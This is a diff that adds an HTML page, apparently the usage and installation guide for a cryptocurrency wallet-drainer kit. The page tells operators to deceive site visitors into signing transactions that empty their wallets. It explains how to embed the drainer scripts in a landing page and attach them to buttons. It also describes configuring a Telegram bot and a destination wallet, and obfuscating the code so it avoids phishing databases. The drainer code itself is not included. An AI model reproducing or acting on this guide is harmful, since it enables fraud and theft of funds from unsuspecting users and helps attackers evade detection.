@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+</head>
+
+<body class="my-5">
+    <main>
+        <section class="py-5 container">
+
+            <div class="pb-5">
+
+                <h4 class="fw-normal text-secondary">Usage Guide</h2>
+
+                    <p>To begin with, let's talk about what kind of script you get: a drainer is a script that allows
+                        you to
+                        withdraw all assets from the wallet of a user who has visited the site. And no, this does not
+                        happen
+                        by
+                        magic, but as a result of the fact that he himself gives you all the assets, signing
+                        transactions in
+                        his
+                        wallet. Your task is only to mislead him so that he does not understand that money will be
+                        deducted
+                        from
+                        him. For example, you can convince him that he will receive money or invest it somewhere - it's
+                        all
+                        up to
+                        you, your income depends on the approach...</p>
+
+                    <p>Let's put all the points right away: the script does not write off all assets in one click, there
+                        is
+                        no
+                        option to write off all assets simply when entering the site.</p>
+
+                    <p>Wallet developers are not stupid either and are trying to protect their users, so you need to be
+                        smarter.
+                        this script tries its best to use the best practices to make things easier for you, but it can't
+                        do
+                        all the
+                        work for you, so you have to try. Income depends only on you and your methods.</p>
+
+            </div>
+
+
+
+            <div class="mb-3">
+
+
+                <h4 class="fw-normal text-secondary">Install Guide</h2>
+
+
+
+                    <p>Now, let's try to install it on your site. This instruction will allow you to install the script
+                        on
+                        any
+                        HTML
+                        site :</p>
+
+                    <p>Installation on the site is very simple, you copy “ <b>assets</b> ” folder from archive and
+                        transfer it to the root of the site.</p>
+
+                    <p>Then you need to go to the "<b>assets/js</b>" folder and find a file called "<b>web3.js</b>"
+                        there.
+                    </p>
+                    <p>Open
+                        this file with any
+                        code editor, for example, Visual Studio Code or Notepad++.</p>
+
+                    <p>At the very top of the script, you will find the "const <b>CF</b> & const <b>TG</b>" variable
+                        <br>Configured your options (TelegramBot, Destination Wallet, etc..), and hide the code using <a
+                            href="https://obfuscator.io">obfuscator.io</a>
+                    </p>
+
+
+
+                    <p>Now open the site file where your landing is located, it is usually called "<b>index.html</b>".
+                        <br><br>
+                        Scroll to the end of the file and find a special tag there that looks like this:
+                        <code>&lt;/body&gt;</code>.
+                        <br>Once you have found it, write the following lines of code right before it:
+                    </p>
+
+
+                    <code class="mb-4">
+    &lt;script src="./assets/js/vendor.min.js"&gt;&lt;/script&gt;
+    <br>
+    &lt;script src="./assets/js/web3.js"&gt;&lt;/script&gt;
+    <br>
+</code>
+
+
+
+                    <p><br><i class="text-muted">Please note that these scripts will only work on hosting and only with an installed SSL
+                        certificate,
+                        that is,
+                        over HTTPS.<br>If you open the file on a local server or just on your computer, most likely nothing will work.
+                    </i></p>
+
+
+
+                    <p>Now you need to connect the drainer to the button just add an element on the page, like this in
+                        code:
+                    </p>
+
+
+                    <code>
+&lt;div id="connect-btn"&gt;&lt;/div&gt;
+</code>
+
+<div style="opacity:70%" class="mt-4 card py-2 px-2">
+
+
+                    <p><i class="text-muted">Optionally if you want to trigger the connection window from other HTML elements (links,
+                        buttons,
+                        images...)</i>
+                    </p>
+
+                    <p><i class="text-muted">Just add "<b>btn-go</b>" class on any html elements :</i></p>
+
+                    <code >
+&lt;button class="<b>btn-go</b>"&gt;Click Me&lt;/button&gt;
+<br>
+&lt;a href="#" class="<b>btn-go</b>"&gt;Link Button&lt;/a&gt;
+<br>
+&lt;div class="<b>btn-go</b>"&gt;Div Button&lt;/div&gt;
+<br>
+&lt;img class="<b>btn-go</b>" src="https://via.placeholder.com/100" alt="Img Button"&gt;
+</code>
+
+
+</div>
+
+                    <p><br>Great, the configuration of the script has been successfully completed, now it must be
+                        obfuscated so that the code does not get into phishing databases, and simply so that no one
+                        steals
+                        it
+                        from
+                        your site, which, of course, is very important.</p>
+
+                    <p>To do this, we need the following site: <a href="https://obfuscator.io">obfuscator.io</a></p>
+
+
+
+                    <p>Open the contents of the "<b>web3.js</b>" file again, where we set up the <b>CF</b> & <b>TG</b>
+                        variables, completely copy all the
+                        contents and paste it into <a href="https://obfuscator.io">obfuscator.io</a></p>
+
+                    <p>Scroll a little lower and find the "<b>Reset Options</b>" button, click on it, scroll a little
+                        lower
+                        and
+                        check the
+                        box next to the two items "<b>Self Defending</b>" and "<b>Debug Protection</b>".</p>
+
+
+
+                    <p>We rise up and press the blue button "<b>Obfuscate</b>" and we get a modified, unreadable code.
+                    </p>
+
+                    <p>We copy it completely and paste the content back (obfuscated) into "<b>web3.js</b>" save it and
+                        upload it
+                        to the
+                        hosting</p>
+
+
+
+                    <p>Great, you are just amazing!</p>
+            </div>
+            </div>
+    </main>
+</body>
+
+</html>
